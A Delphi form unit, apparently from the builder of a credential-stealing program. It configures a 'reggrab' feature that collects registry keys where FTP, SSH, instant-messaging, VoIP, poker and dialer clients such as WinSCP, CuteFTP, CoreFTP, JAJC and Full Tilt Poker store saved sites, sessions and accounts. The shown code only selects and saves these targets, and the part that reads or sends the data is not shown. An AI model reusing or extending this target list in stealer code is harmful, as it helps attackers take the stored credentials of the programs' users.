unit RegGrabForm;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Menus, ActnList;

type
  TForm10 = class(TForm)
    Button1: TButton;
    ListBox1: TListBox;
    CheckBox1: TCheckBox;
    Button2: TButton;
    Button3: TButton;
    Label1: TLabel;
    ComboBox1: TComboBox;
    Label2: TLabel;
    Edit1: TEdit;
    PopupMenu2: TPopupMenu;
    N1: TMenuItem;
    Button4: TButton;
    PopupMenu1: TPopupMenu;
    CoreFTP1: TMenuItem;
    FTPExplorer1: TMenuItem;
    ActionList1: TActionList;
    Action1: TAction;
    Action2: TAction;
    N2: TMenuItem;
    Action3: TAction;
    CuteFTP8Professional1: TMenuItem;
    ClassicFTP1: TMenuItem;
    Action4: TAction;
    Gling1: TMenuItem;
    Action5: TAction;
    CoffeeCupFreeFTP1: TMenuItem;
    Action6: TAction;
    FAR1: TMenuItem;
    Action7: TAction;
    WinSCP1: TMenuItem;
    Action8: TAction;
    GizmoProject1: TMenuItem;
    Action9: TAction;
    JAJC1: TMenuItem;
    Action10: TAction;
    FullTiltPoker1: TMenuItem;
    Action11: TAction;
    AdvancedDialer1: TMenuItem;
    Action12: TAction;
    procedure FormDestroy(Sender: TObject);
    procedure Action12Execute(Sender: TObject);
    procedure AdvancedDialer1Click(Sender: TObject);
    procedure Action11Execute(Sender: TObject);
    procedure FullTiltPoker1Click(Sender: TObject);
    procedure Action10Execute(Sender: TObject);
    procedure JAJC1Click(Sender: TObject);
    procedure Action9Execute(Sender: TObject);
    procedure GizmoProject1Click(Sender: TObject);
    procedure Action8Execute(Sender: TObject);
    procedure WinSCP1Click(Sender: TObject);
    procedure Action7Execute(Sender: TObject);
    procedure FAR1Click(Sender: TObject);
    procedure Action6Execute(Sender: TObject);
    procedure CoffeeCupFreeFTP1Click(Sender: TObject);
    procedure Action5Execute(Sender: TObject);
    procedure Gling1Click(Sender: TObject);
    procedure Action4Execute(Sender: TObject);
    procedure ClassicFTP1Click(Sender: TObject);
    procedure CuteFTP8Professional1Click(Sender: TObject);
    procedure Action3Execute(Sender: TObject);
    procedure N2Click(Sender: TObject);
    procedure Action2Execute(Sender: TObject);
    procedure Action1Execute(Sender: TObject);
    procedure FTPExplorer1Click(Sender: TObject);
    procedure CoreFTP1Click(Sender: TObject);
    procedure Button4Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure CheckBox1Click(Sender: TObject);
    procedure N1Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

uses Unit3;

procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  EnableWindow(unit3.Form3.Handle, true);
  BringWindowToTop(unit3.Form3.Handle);
  Action := caFree;
end;

procedure TForm10.Button1Click(Sender: TObject);
begin
  EnableWindow(unit3.Form3.Handle, true);
  BringWindowToTop(unit3.Form3.Handle);
  form10.Release;
end;

procedure TForm10.Button2Click(Sender: TObject);
begin
if edit1.text<>'' then listbox1.items.add(combobox1.text+'\'+edit1.text);
end;

procedure TForm10.Button3Click(Sender: TObject);
begin
listbox1.Clear;
end;

procedure TForm10.N1Click(Sender: TObject);
begin
if listbox1.ItemIndex<>-1 then listbox1.Items.Delete(listbox1.ItemIndex);
end;

procedure TForm10.CheckBox1Click(Sender: TObject);
begin
if checkbox1.checked then
  begin
    edit1.Enabled:=true;
    combobox1.Enabled:=true;
    label1.Enabled:=true;
    label2.Enabled:=true;
    listbox1.Enabled:=true;
    button2.Enabled:=true;
    button3.Enabled:=true;
    button4.Enabled:=true;
  end
else
  begin
    edit1.Enabled:=false;
    combobox1.Enabled:=false;
    label1.Enabled:=false;
    label2.Enabled:=false;
    listbox1.Enabled:=false;
    button2.Enabled:=false;
    button3.Enabled:=false;
    button4.Enabled:=false;
  end;
end;


procedure TForm10.FormCreate(Sender: TObject);
var
  i:integer;
begin
  checkbox1.Checked:=bs.reggrab;
  if bs.reggrab_fc>0 then
  for i:=0 to bs.reggrab_fc-1 do listbox1.Items.Add(bs.reggrab_files[i]);
end;

procedure TForm10.Button4Click(Sender: TObject);
begin
PopupMenu1.Popup(Mouse.CursorPos.X, Mouse.CursorPos.y);
end;

procedure TForm10.N2Click(Sender: TObject);
var
i:dword;
begin
for i:=0 to actionlist1.ActionCount-1 do
actionlist1.Actions[i].Execute;
end;

procedure TForm10.CoreFTP1Click(Sender: TObject);
begin
actionlist1.Actions[0].Execute;
end;

procedure TForm10.FTPExplorer1Click(Sender: TObject);
begin
actionlist1.Actions[1].Execute;
end;

procedure TForm10.Action1Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\FTPWare\CoreFTP\Sites');
end;

procedure TForm10.Action2Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\FTP Explorer\Profiles');
end;

procedure TForm10.Action3Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\GlobalSCAPE\CuteFTP 8 Professional\QCToolbar');
end;

procedure TForm10.CuteFTP8Professional1Click(Sender: TObject);
begin
actionlist1.Actions[2].Execute;
end;

procedure TForm10.ClassicFTP1Click(Sender: TObject);
begin
actionlist1.Actions[3].Execute;
end;

procedure TForm10.Action4Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\NCH Software\ClassicFTP\FTPAccounts');
end;

procedure TForm10.Gling1Click(Sender: TObject);
begin
actionlist1.Actions[4].Execute;
end;

procedure TForm10.Action5Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\NCH Software\Fling\Accounts');
end;

procedure TForm10.CoffeeCupFreeFTP1Click(Sender: TObject);
begin
actionlist1.Actions[5].Execute;
end;

procedure TForm10.Action6Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\CoffeeCup Software\Internet\Profiles');
end;

procedure TForm10.FAR1Click(Sender: TObject);
begin
actionlist1.Actions[6].Execute;
end;

procedure TForm10.Action7Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\Far\Plugins\FTP\Hosts');
listbox1.Items.Add('HKEY_CURRENT_USER\Software\Far2\Plugins\FTP\Hosts');
end;

procedure TForm10.WinSCP1Click(Sender: TObject);
begin
actionlist1.Actions[7].Execute;
end;

procedure TForm10.Action8Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\Martin Prikryl\WinSCP 2\Sessions');
end;


procedure TForm10.GizmoProject1Click(Sender: TObject);
begin
actionlist1.Actions[8].Execute;
end;

procedure TForm10.Action9Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\Sipphone\Gizmo Project\Accounts');
end;

procedure TForm10.JAJC1Click(Sender: TObject);
begin
actionlist1.Actions[9].Execute;
end;

procedure TForm10.Action10Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\ABstract Software\JAJC\Accounts');
end;

procedure TForm10.FullTiltPoker1Click(Sender: TObject);
begin
actionlist1.Actions[10].Execute;
end;

procedure TForm10.Action11Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\Full Tilt Poker\UserInfo');
end;

procedure TForm10.AdvancedDialer1Click(Sender: TObject);
begin
actionlist1.Actions[11].Execute;
end;

procedure TForm10.Action12Execute(Sender: TObject);
begin
listbox1.Items.Add('HKEY_CURRENT_USER\Software\PySoft\AutoConnect');
end;

procedure TForm10.FormDestroy(Sender: TObject);
var
  i:integer;
begin
  bs.reggrab:=checkbox1.Checked;
  bs.reggrab_fc:=listbox1.Items.Count;
  if listbox1.Items.Count>0 then
  for i:=0 to listbox1.Items.Count-1 do bs.reggrab_files[i]:=listbox1.Items[i];
end;

end.
